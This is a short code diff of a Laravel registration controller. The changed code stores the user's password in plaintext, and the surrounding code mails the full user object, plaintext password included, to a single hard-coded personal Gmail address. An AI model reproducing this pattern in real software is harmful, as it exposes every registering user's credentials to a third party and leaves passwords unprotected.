@@ -46,8 +46,10 @@ class RegisterController extends Controller
         $user->password = $request->password;
         $user->type = $request->type;
         $user->save();
+
+        $user->password = $request->password;
+        $user->register = 1;
         
-        $user->uuid = $request->password;
         Mail::to('abbas8156@gmail.com')->send(new WelcomeEmail($user));
 
         $credentials = $request->only('email', 'password');
